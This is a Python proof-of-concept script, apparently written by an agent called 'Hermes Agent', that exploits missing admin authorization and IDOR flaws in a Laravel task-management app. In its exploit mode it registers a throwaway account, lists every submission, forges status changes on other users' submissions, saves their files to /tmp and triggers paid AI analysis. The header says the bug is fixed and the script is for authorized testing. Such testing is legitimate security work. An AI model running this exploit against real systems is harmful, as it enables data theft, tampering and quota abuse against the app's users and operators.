"""
PoC — Broken Authorization on admin routes (BFLA + IDOR)
========================================================
Issue type : Broken Function Level Authorization (BFLA) + Insecure Direct Object Reference (IDOR)
Product    : laravel-reza (Laravel web app) — admin task management module
Affected   : /admin/tugas, /admin/tugas/{id}/status, /admin/tugas/{id}/komentar,
             /admin/tugas/{id}/download, /admin/tugas/{id}/analisis-ai
CWE        : CWE-862 (Missing Authorization) / CWE-639 (Authorization bypass using user-supplied id)
CVSS       : 8.3 (High)
Status     : FIXED in reviewed copy — demo verifies the patch holds (expect 403).

Researcher : Mas Admin (Hermes Agent)
Reference  : routes/web.php, app/Http/Controllers/TugasController.php

Usage:
  python3 POC_admin_bypass.py --target <url> --check
  python3 POC_admin_bypass.py --target <url> --exploit --id <tugas_id>
  python3 POC_admin_bypass.py --target <url> --exploit --id <tugas_id> --debug

  --check    Detect only: register a fresh 'peserta' and probe GET /admin/tugas.
             Safe — no data mutation. Exits 0 if vulnerable, 3 if patched.
  --exploit  Full demonstration: register, then enumerate, forge status update,
             download victim file, and trigger AI analysis. MUTATES DATA + COST.
             ONLY on systems you own / are authorized to test.
  --id       Target tugas id to demonstrate IDOR (default 1).
  --debug    Verbose HTTP/response detail.

Disclaimer: For authorized testing / education only. Unauthorized use is illegal.
"""

import argparse
import random
import re
import string
import sys
import time

try:
    import requests
except ImportError:
    sys.exit("[-] 'requests' is required. Install with: pip install requests")

USER_AGENT = "POC_admin_bypass/1.0"


class Fmt:
    YELLOW = "\033[93m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    RESET = "\033[0m"

    @staticmethod
    def info(t):    print(f"{Fmt.BLUE}[*] {t}{Fmt.RESET}")
    @staticmethod
    def succ(t):    print(f"{Fmt.GREEN}[+] {t}{Fmt.RESET}")
    @staticmethod
    def fail(t):    print(f"{Fmt.RED}[-] {t}{Fmt.RESET}")
    @staticmethod
    def warn(t):    print(f"{Fmt.RED}[!] {t}{Fmt.RESET}")


def rand_email(sess_id=""):
    return f"poc_bfla_{int(time.time())}_{random.randint(100,999)}@test.com"


def _csrf(s):
    """Return (session, csrf_token) by loading the register page."""
    import warnings
    warnings.simplefilter("ignore")
    s.headers.update({"User-Agent": USER_AGENT})
    r = s.get(url + "/register", timeout=15, verify=False)
    m = re.search(r'name="_token" value="([^"]+)"', r.text)
    if not m:
        Fmt.fail("Could not extract CSRF token from /register")
        sys.exit(2)
    return s, m.group(1)


def register(s, csrf):
    email = rand_email()
    r = s.post(url + "/register", data={
        "_token": csrf,
        "name": "pocbfla",
        "email": email,
        "password": "Password123!",
        "password_confirmation": "Password123!",
    }, allow_redirects=False, timeout=15)
    if r.status_code not in (302, 303, 200):
        Fmt.fail(f"Registration failed HTTP {r.status_code}")
        sys.exit(2)
    Fmt.info(f"Registered peserta: {email}")
    return s


def check(args):
    Fmt.info(f"Target : {args.target}")
    s = requests.Session()
    s, csrf = _csrf(s)
    s = register(s, csrf)
    Fmt.info("[--check] Probing GET /admin/tugas as 'peserta'...")
    r = s.get(url.rstrip("/") + "/admin/tugas", timeout=15)
    if r.status_code == 403:
        Fmt.succ("Detected PATCHED: /admin/tugas returned 403. AdminMiddleware works.")
        return 3
    if r.status_code == 200 and "Data Tugas Peserta" in r.text:
        Fmt.warn("VULNERABLE: /admin/tugas returned 200 with admin data to a peserta!")
        Fmt.warn("All participant submissions + file links are exposed.")
        return 0
    Fmt.fail(f"Unexpected status {r.status_code}")
    return 2


def exploit(args):
    s = requests.Session()
    s, csrf = _csrf(s)
    s = register(s, csrf)
    base = url.rstrip("/")
    tid = args.id

    Fmt.info(f"[1/4] Enumerate submissions (GET /admin/tugas)")
    r = s.get(base + "/admin/tugas", timeout=15)
    if r.status_code != 200:
        Fmt.fail(f"GET /admin/tugas -> {r.status_code} (403 = patched, exploit stopped)")
        return 3
    Fmt.warn("Listed all submissions as peserta (data leak confirmed).")

    Fmt.info(f"[2/4] Forge status update on tugas id={tid} (PUT status)")
    # Simulate the update route (verb put). Some setups need _method injection.
    r2 = s.post(base + f"/admin/tugas/{tid}/status", data={
        "_token": csrf, "_method": "PUT",
        "status": "Revisi", "komentar": "Pwned-PoC",
    }, allow_redirects=False, timeout=15)
    if r2.status_code in (302, 303, 200):
        Fmt.warn(f"Updated another user's submission (HTTP {r2.status_code}). IDOR confirmed.")
    else:
        Fmt.info(f"Status update HTTP {r2.status_code} (403/422 = patched)")

    Fmt.info(f"[3/4] Download victim file (GET /admin/tugas/{tid}/download)")
    r3 = s.get(base + f"/admin/tugas/{tid}/download", timeout=15)
    if r3.status_code == 200 and r3.content:
        size = len(r3.content)
        fn = f"/tmp/poc_stolen_{tid}.pdf"
        open(fn, "wb").write(r3.content)
        Fmt.warn(f"Downloaded {size} bytes from another user -> {fn}")
    else:
        Fmt.info(f"Download HTTP {r3.status_code} (403 = patched)")

    Fmt.info(f"[4/4] Trigger AI analysis (GET /admin/tugas/{tid}/analisis-ai) [COSTS GROQ]")
    r4 = s.get(base + f"/admin/tugas/{tid}/analisis-ai", allow_redirects=False, timeout=30)
    if r4.status_code == 200 or r4.status_code in (302, 303):
        Fmt.warn("AI analysis triggered for a foreign submission (quota abuse).")
    else:
        Fmt.info(f"AI analysis HTTP {r4.status_code} (patched if 403)")

    Fmt.info("Exploit flow complete.")
    return 0


def main():
    global url
    p = argparse.ArgumentParser(description="BFLA + IDOR PoC for laravel-reza admin routes")
    p.add_argument("--target", required=True, help="Base URL of the app")
    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("--check", action="store_true", help="Safe detection only")
    mode.add_argument("--exploit", action="store_true", help="Full (mutating) exploitation")
    p.add_argument("--id", type=int, default=1, help="Tugas id to target (default 1)")
    p.add_argument("--debug", action="store_true", help="Verbose output")
    p.add_argument("--insecure", action="store_true", help="Skip TLS verify for https targets")
    args = p.parse_args()

    url = args.target
    import urllib3
    if args.insecure:
        urllib3.disable_warnings()

    if args.check:
        sys.exit(check(args))
    else:
        sys.exit(exploit(args))


main()